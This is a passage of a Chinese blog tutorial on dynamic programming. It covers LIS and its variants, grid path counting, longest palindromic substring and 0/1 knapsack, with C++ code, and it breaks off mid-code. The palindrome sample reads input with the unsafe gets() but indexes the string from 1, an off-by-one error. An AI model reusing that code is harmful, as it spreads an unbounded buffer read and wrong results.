+<p>需要注意的是，d[len]所存结果并不是最终的LIS序列，但其len值是最大的LIS长度，并且每一个d[len]的值（如37）都一定是可达的（即有以它为结尾的LIS），只不过可达的路径中有的值可能被替换掉了。</p>
+<p><img src="LIS%E4%BC%98%E5%8C%96.jpg" alt="LIS优化"></p>
+<p>在此解法中，遍历耗时n，查找替换值可采用二分查找法，耗时logn，总的复杂度为<strong>O(nlogn)</strong>.</p>
+<p><strong>代码：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], dp[maxn],d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n, len = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//存入A[i]，从1开始</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">	d[++len] = A[<span class="number">1</span>];<span class="comment">//初始化</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (A[i] &gt;= d[len])</span><br><span class="line">			d[++len] = A[i];</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> *j = <span class="built_in">upper_bound</span>(d + <span class="number">1</span>, d + len + <span class="number">1</span>, A[i]);</span><br><span class="line">			*j = A[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, len);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>upper_bound(first,last,val)：STL algorithm中的函数，用于在一个<strong>升序</strong>数组/容器中。在[first,last)中找到第一个值大于val的元素并返回其指针，first、last也是位置指针。同理还有lower_bound，它找的是第一个值大于等于val的元素，他们都采用二分查找，复杂度为O(logn)。</p>
+<p>如果是降序容器，需要用greater<int>()重载upper_bound。</p>
+</blockquote>
+<h5 id="拓1：合唱队形"><a href="#拓1：合唱队形" class="headerlink" title="拓1：合唱队形"></a>拓1：合唱队形</h5><p><img src="%E5%90%88%E5%94%B1%E9%98%9F%E5%BD%A2.jpg" alt="合唱队形"></p>
+<p><strong>解法：</strong>此题就是求最长的山形队列，采用两个方向LIS的方法，枚举每个人站在中间时的最优解即可。使用两个dp数组存入从左到右和从右到左的以i结尾的LIS长度信息，此时dp1[i]+dp2[i]-1即是最长的山形队列长度。</p>
+<p><strong>代码：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], dp1[maxn],dp2[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//存入A[i]，从1开始</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//正向升序序列</span></span><br><span class="line">	&#123;</span><br><span class="line">		dp1[i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (A[j] &lt; A[i])</span><br><span class="line">			&#123;</span><br><span class="line">				dp1[i] = <span class="built_in">max</span>(dp1[i], dp1[j] + <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--)<span class="comment">//反向升序序列</span></span><br><span class="line">	&#123;</span><br><span class="line">		dp2[i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = n; j &gt; i; j--)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (A[j] &lt; A[i])</span><br><span class="line">			&#123;</span><br><span class="line">				dp2[i] = <span class="built_in">max</span>(dp2[i], dp2[j] + <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ans = <span class="built_in">max</span>(ans, dp1[i] + dp2[i] - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, n-ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="拓2：低价购买"><a href="#拓2：低价购买" class="headerlink" title="拓2：低价购买"></a>拓2：低价购买</h5><p><img src="%E4%BD%8E%E4%BB%B7%E8%B4%AD%E4%B9%B0.jpg" alt="低价购买"></p>
+<p><strong>解法：</strong>此题主要是要求LIS的数目，采用另一个数组f来记录LIS方案数。其中倘若 <code>a[i] = a[j] &amp;&amp; dp[i] = dp[j]</code> 则意味着以i结尾的LIS和以j结尾的LIS相同，此时其中一个LIS不计入方案（<u>两个相同取一个即可</u>）；若 <code>a[i] &lt; a[j] &amp;&amp; dp[i] = dp[j] + 1</code> 则意味着以i结尾的LIS可以由以j结尾的LIS转移过来，此时的方案数等于f[j] + f[i]。（<u>解释：如果有j1和j2，他们的LIS长度相同并且都等于dp[i]-1，意味着i可以由j1转移过来，也可以由j2转移过来</u><u>，则到达i的方案数为j1的方案数+j2的方案数</u>）边界条件：LIS长为1，此时方案数为1；其他情况方案数初始化为0.</p>
+<p><strong>代码：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], dp[maxn],f[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//存入A[i]，从1开始</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">	<span class="keyword">int</span> maxx = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++)<span class="comment">//LIS</span></span><br><span class="line">	&#123;</span><br><span class="line">		dp[i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (A[i] &lt; A[j])</span><br><span class="line">			&#123;</span><br><span class="line">				dp[i] = <span class="built_in">max</span>(dp[i], dp[j] + <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		maxx = <span class="built_in">max</span>(maxx, dp[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (dp[i] == <span class="number">1</span>)f[i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (dp[i] == dp[j] &amp;&amp; A[i] == A[j])</span><br><span class="line">				f[j] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (dp[i] == dp[j] + <span class="number">1</span> &amp;&amp; A[i] &lt; A[j])</span><br><span class="line">				f[i] += f[j];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (dp[i] == maxx)</span><br><span class="line">			ans += f[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, maxx, ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="二维动态规划"><a href="#二维动态规划" class="headerlink" title="二维动态规划"></a>二维动态规划</h3><hr>
+<h4 id="1-马拦过河卒"><a href="#1-马拦过河卒" class="headerlink" title="1.马拦过河卒"></a>1.马拦过河卒</h4><p><img src="%E8%BF%87%E6%B2%B3%E5%8D%92.jpg" alt="过河卒"></p>
+<p><strong>解法：</strong>此题用二维数组dp记录每个坐标的路径条数，则$dp[n][m]$即所求。</p>
+<p>状态转移方程：$dp[x][y] = dp[x-1][y] + dp[x][y-1]$.边界值：$dp[0][y] = 1$和$dp[x][0] = 1$.即坐标轴上的值路径均为1.需要注意的是，倘若马的控制点在坐标轴上，则该点及其后的点均不可达（路径数为0）</p>
+<p><strong>代码：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> horse[<span class="number">21</span>][<span class="number">21</span>];</span><br><span class="line"><span class="keyword">int</span> stepx[<span class="number">8</span>] = &#123; <span class="number">-2</span>,<span class="number">-2</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> stepy[<span class="number">8</span>] = &#123; <span class="number">-1</span>,<span class="number">1</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-1</span>,<span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">21</span>][<span class="number">21</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> m, n, X, Y;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;X, &amp;Y);</span><br><span class="line">	horse[X][Y] = <span class="literal">true</span>;<span class="comment">//马所在位置也被控制</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)<span class="comment">//初始化马的控制点，采用二维数组记录棋盘，被马控制则为true</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> x = X + stepx[i];</span><br><span class="line">		<span class="keyword">int</span> y = Y + stepy[i];</span><br><span class="line">		<span class="keyword">if</span> (x &gt;= <span class="number">0</span> &amp;&amp; x &lt;= n &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt;= m)</span><br><span class="line">			horse[x][y] = <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= m; i++)<span class="comment">//y状态初值,注意马的影响</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!horse[<span class="number">0</span>][i])</span><br><span class="line">			dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span>;<span class="comment">//注意，倘若坐标轴上有一点不可达，则其后的点都不可达</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++)<span class="comment">//x状态初值,注意马的影响</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!horse[i][<span class="number">0</span>])</span><br><span class="line">			dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span>;<span class="comment">//注意，倘若坐标轴上有一点不可达，则其后的点都不可达</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//二维数组状态转移</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!horse[i][j])</span><br><span class="line">				dp[i][j] = dp[i - <span class="number">1</span>][j] + dp[i][j - <span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, dp[n][m]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-最长回文串"><a href="#2-最长回文串" class="headerlink" title="2.最长回文串"></a>2.最长回文串</h4><p><img src="%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E4%B8%B2.jpg" alt="最长回文串"></p>
+<p><strong>解法：</strong>以$dp[i][j]$表示A[i]到A[j]的子串是不是回文串，若是则置其值为1，不是则置为0.那么求$dp[i][j]$的值有两种情形：1.A[i] != A[j]则$dp[i][j]$必为0。2.A[i] == A[j]则$dp[i][j]$是否是回文串取决于$dp[i+1][j-1]$是否是回文串。</p>
+<p><u>状态转移方程如下</u>：<br>$$<br>dp[i][j] =<br>\left{<br>             \begin{array}{<strong>lr</strong>}<br>             dp[i+1][j-1]&amp;,A[i] = A[j]  \<br>            0&amp;, A[i] != A[j]<br>             \end{array}<br>\right.<br>$$<br><u>边界条件为</u>：1.长度为1的子串dp值均为1（都是回文串）2.长度为2的子串根据两个字母值是否相等来确定dp的值。即为：$dp[i][i] = 1 ,dp[i][i+1] = (A[i] == A[i+1]) ? 1 : 0$</p>
+<p>以下分析如何求dp数组：倘若按照i，j按顺序遍历来求解，例如固定i=1，j从1开始遍历，当开始计算$dp[1][3]$时，我们需要$dp[2][2]$的值，而此时i=1，$dp[2][2]$的值还未知。事实上，以任何顺序遍历求解都无法保证完成。所以我们按照<u>长度和子串首位遍历</u>求解，从长度为3的子串开始，枚举子串的起始位置（i处）。</p>
+<p>此算法复杂度为$O(n^2)$</p>
+<p><strong>代码：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1010</span>;</span><br><span class="line"><span class="keyword">char</span> A[maxn];</span><br><span class="line"><span class="keyword">int</span> dp[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">gets</span>(A);</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(A),ans = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dp));<span class="comment">//string.h中的内存赋值函数，其中各个参数分别为：内存指针，要赋的值，填充的字节数。此行功能为将dp数组赋值为0.</span></span><br><span class="line">    <span class="comment">//设置边界</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[i][i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; len)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i] == A[i+<span class="number">1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i][i+<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">                ans = <span class="number">2</span>;<span class="comment">//注意更新当前最长回文串长度</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//状态转移方程</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> l = <span class="number">3</span>; l &lt;= len; l++)<span class="comment">//枚举字串长度</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i + l - <span class="number">1</span> &lt; len; i++)<span class="comment">//枚举子串起始位置</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> j = i + l - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(A[i] == A[j] &amp;&amp; dp[i+<span class="number">1</span>][j<span class="number">-1</span>] == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i][j] = <span class="number">1</span>;</span><br><span class="line">                ans = l;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-背包问题"><a href="#3-背包问题" class="headerlink" title="3.背包问题"></a>3.背包问题</h4><h5 id="01背包"><a href="#01背包" class="headerlink" title="01背包"></a>01背包</h5><p><img src="01%E8%83%8C%E5%8C%85.jpg" alt="01背包"></p>
+<p><strong>解法：</strong>此题采用动态规划方法，将n件物品编号，拿到第i件物品时最大的总价值dp[i]取决于拿第i-1件物品时的最大总价值。当拿到第i件物品时背包容量不够，则dp[i] = dp[i-1]；当拿到第i件物品时背包容量足够容纳该物品，则可以选择拿dp[i] = dp[i-1]+c[i]或者不拿dp[i] = dp[i-1]。我们除了记录i之外，还需要一维来记录数组容量，倘若只有i物品的选取与否来决定最大价值显然会变成贪心算法，而贪心算法无法求出最优解。当我们可以选取物品i时（v&gt;w[i]），就去考虑小背包的最大价值。最后遍历第n件物品的v（0~V），最大值即所求。（并没有要求背包装满）</p>
+<p><u>状态转移方程如下</u>:$dp[i][v] = max(dp[i-1][v],dp[i-1][v-w[i]] + c[i]) (1 \leq i \leq n , w[i] \leq v \leq V)$</p>
+<p><u>边界条件</u>：$dp[0][v] = 0 (0 \leq v \leq V)$ 即前0件物品放入任何容量的背包中都只能获得价值0.</p>
+<p>此解法复杂度为$O(nV)$.</p>
+<p><strong>空间优化：</strong>如下图，我们可以看出，在动态转移过程中，对每个i的求解都只需要i-1的状态值（即上一行），若用整个二维数组记录所有的值显得有些浪费。实际上我们可以只用一个一维数组，仅保留求解时需要的值，求解完毕则可以丢弃（留给其他的用）该块空间，称为<u>滚动数组</u>。</p>
+<p>假设i=1，则图中第一行的值全为0，第二行的值根据第一行来确定，如图所示。在优化的解法中，我们仅有一行来保存数据，在初始化时将它设置为全零。我们计算第i行的数据时（即图中第二行），在对每一个v的计算中，需要参考当前块的值和v-w[i]块的值，而在更新数组之前这两块的值都是上一次的，即i-1行的，正是我们所需要的；在更新之后当前的块则是第i行的了，供给i+1行使用。</p>
+<p>根据上面的描述我们不难发现，必须从后往前更新数组才可以。因为倘若从前往后更新，则数组左边是已经更新（第i行）的数据，右边是更新前（第i-1行）的数据，而在往右更新时，我们需要左边上一行的数据来比较大小，此时左边上一行的数据已经被覆盖掉了。</p>
+<p><u>优化后的状态转移方程</u>：$dp[v] = max(dp[v], dp[v - w[i]] + c[i]) (1 \leq i \leq n, w[i] \leq v \leq V)$</p>
+<p><img src="01%E8%83%8C%E5%8C%85%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg" alt="01背包示意图"></p>
+<p><strong>代码：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">100</span>;<span class="comment">//物品最大件数</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxv = <span class="number">1000</span>;<span class="comment">//V最大上限</span></span><br><span class="line"><span class="keyword">int</span> w[maxn],c[maxn],dp[maxv];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,V;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;V);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//下标从i开始</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;w[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//边界</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> v = <span class="number">0</span>; v &lt;= V; v++)<span 